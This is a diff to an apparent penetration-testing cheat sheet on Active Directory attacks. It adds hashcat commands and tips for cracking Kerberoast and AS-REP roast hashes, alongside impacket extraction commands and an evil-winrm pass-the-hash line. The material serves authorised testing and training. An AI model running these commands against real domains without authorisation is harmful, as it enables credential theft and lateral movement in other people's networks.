@@ -90,15 +90,20 @@ evil-winrm -i TARGET -u USER -H NTLM_HASH
 ```
 # From Linux:
 impacket-GetUserSPNs -request -dc-ip DC DOMAIN/USER:PASSWORD
-# Crack with hashcat:
-hashcat -m 13100 kerberoast.txt wordlist.txt
+# Crack with the common list + rule. (mode 13100 = RC4 TGS; 19600/19700 = AES)
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+# best64 misses? one heavier rule is the ceiling, then move on:
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
 ```
 
 **AS-REP Roasting** (users with "Do not require Kerberos preauthentication"):
 ```
 impacket-GetNPUsers -dc-ip DC DOMAIN/ -usersfile users.txt -no-pass
-hashcat -m 18200 asrep.txt wordlist.txt
+# mode 18200 = RC4 AS-REP. rockyou + best64.rule; if it misses, the account isn't in common lists — move on.
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
+Don't rabbit-hole: if rockyou + a rule doesn't crack it, record uncracked and pivot — don't brute-force.
+(KB: "hash cracking methodology" for exact commands.)
 
 **Pass-the-Ticket:**
 ```
